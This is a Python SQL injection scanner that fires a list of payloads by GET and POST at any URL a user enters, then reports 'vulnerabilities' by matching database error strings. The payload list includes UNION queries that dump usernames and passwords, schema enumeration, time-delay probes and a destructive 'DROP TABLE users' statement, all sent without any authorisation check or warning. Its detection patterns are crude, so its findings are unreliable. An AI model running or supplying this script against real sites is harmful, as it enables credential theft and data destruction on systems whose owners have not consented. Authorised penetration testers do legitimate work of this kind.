import requests
import logging
import json
import re

# Set up logging configuration
logging.basicConfig(
    filename='sql_injection_tests.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logging.info("SQL Injection Testing Script by Raja Muhammad Awais")

# Updated list of SQL injection payloads
sql_payloads = [
    {"payload": "' OR 1=1 --", "type": "Basic"},
    {"payload": "' OR 'a'='a", "type": "Basic - Always True"},
    {"payload": "' OR '1'='1", "type": "Basic - Always True"},
    {"payload": "' OR 1=0 --", "type": "Basic - Always False"},
    {"payload": "' OR 'a'='b", "type": "Basic - Always False"},
    {"payload": "' OR '1'='2", "type": "Basic - Always False"},
    {"payload": "' OR username IS NULL; --", "type": "IS NULL Check"},
    {"payload": "' OR username IS NOT NULL; --", "type": "IS NOT NULL Check"},
    {"payload": "' OR 1=1 ORDER BY 1 --", "type": "ORDER BY Bypass"},
    {"payload": "' OR 1=1 ORDER BY 2 --", "type": "ORDER BY Bypass"},
    {"payload": "' OR 1=1 ORDER BY 3 --", "type": "ORDER BY Bypass"},
    {"payload": "' UNION SELECT 1,2,3 --", "type": "Union-based"},
    {"payload": "' UNION SELECT NULL,NULL,NULL --", "type": "Union-based with NULLs"},
    {"payload": "' UNION SELECT @@version,NULL,NULL --", "type": "Union-based with Version"},
    {"payload": "' UNION SELECT user(),NULL,NULL --", "type": "Union-based with Current User"},
    {"payload": "' UNION SELECT database(),NULL,NULL --", "type": "Union-based with Current Database"},
    {"payload": "' UNION SELECT table_name,table_schema,1 FROM information_schema.tables --", "type": "Union-based Information Schema"},
    {"payload": "' UNION SELECT column_name,table_name,1 FROM information_schema.columns --", "type": "Union-based Information Schema Columns"},
    {"payload": "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users --", "type": "Union-based Dumping Users"},
    {"payload": "'; DROP TABLE users; --", "type": "SQL Injection with Table Drop"},
    {"payload": "' OR SLEEP(5) --", "type": "Blind SQL Injection - Time Delay"},
    {"payload": "'; WAITFOR DELAY '00:00:05' --", "type": "Blind SQL Injection - Time Delay"},
]

# Common SQL error patterns to detect high and low vulnerability levels
high_vulnerability_patterns = [
    "syntax error",
    "unexpected end of sql command",
    "incorrect syntax near",
    "error in your sql syntax",
    "unclosed quotation mark",
    "unterminated string constant",
    "fatal error",
    "sql error",
    "ora-",
    "mysql error",
]

lower_vulnerability_patterns = [
    "unexpected T_STRING",
    "unexpected T_CONSTANT_ENCAPSED_STRING",
    "near",
    "unknown column",
    "no such table",
    "column count doesn't match",
]

# Function to test SQL injection vulnerabilities
def test_sql_injection(base_url, payload_info):
    payload = payload_info["payload"]
    payload_type = payload_info["type"]

    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        # Test GET request
        response_get = requests.get(f"{base_url}?input={payload}", headers=headers, timeout=10)

        high_vulnerability = any(
            re.search(pattern, response_get.text, re.IGNORECASE) for pattern in high_vulnerability_patterns
        )

        low_vulnerability = any(
            re.search(pattern, response_get.text, re.IGNORECASE) for pattern in lower_vulnerability_patterns
        )

        result_get = {
            "url": f"{base_url}?input={payload}",
            "method": "GET",
            "payload": payload,
            "payload_type": payload_type,
            "high_vulnerability": high_vulnerability,
            "low_vulnerability": low_vulnerability,
            "response_snippet": response_get.text[:500],  # Truncate for brevity
        }

        # Test POST request
        response_post = requests.post(base_url, data={"input": payload}, headers=headers, timeout=10)

        high_vulnerability_post = any(
            re.search(pattern, response_post.text, re.IGNORECASE) for pattern in high_vulnerability_patterns
        )

        low_vulnerability_post = any(
            re.search(pattern, response_post.text, re.IGNORECASE) for pattern in lower_vulnerability_patterns
        )

        result_post = {
            "url": base_url,
            "method": "POST",
            "payload": payload,
            "payload_type": payload_type,
            "high_vulnerability": high_vulnerability_post,
            "low_vulnerability": low_vulnerability_post,
            "response_snippet": response_post.text[:500],  # Truncate for brevity
        }

        return result_get, result_post  # Return results for both GET and POST

    except requests.exceptions.RequestException as e:
        logging.error(f"Request error during SQL Injection test: {e} (logged by Raja Muhammad Awais)")
        return None

# Get user input for the base URL
base_url = input("Enter the base URL for SQL Injection testing: ").strip()

# Validate the base URL
if not base_url.startswith("http"):
    print("Invalid base URL. Ensure it starts with 'http' or 'https'.")
else:
    results = []

    # Test the base URL with the defined SQL injection payloads
    for payload_info in sql_payloads:
        test_results = test_sql_injection(base_url, payload_info)

        if test_results:  # Add results if not None
            results.extend(test_results)

    # Display results on the screen
    for result in results:
        print("Result:")
        print("URL:", result["url"])
        print("Method:", result["method"])
        print("Payload:", result["payload"])
        print("Response Snippet:", result["response_snippet"][:100])
        
        if result["high_vulnerability"]:
            print("High Vulnerability Detected\n")
        elif result["low_vulnerability"]:
            print("Lower Vulnerability Detected\n")
        else:
            print("No obvious SQL injection vulnerability detected.\n")

    # Save results to a JSON file for further analysis
    if results:
        with open("sql_injection_results.json", "w") as json_file:
            json.dump(results, json_file, indent=4)

        logging.info("SQL Injection testing completed (by Raja Muhammad Awais).")
    else:
        logging.error("No results obtained (by Raja Muhammad Awais).")
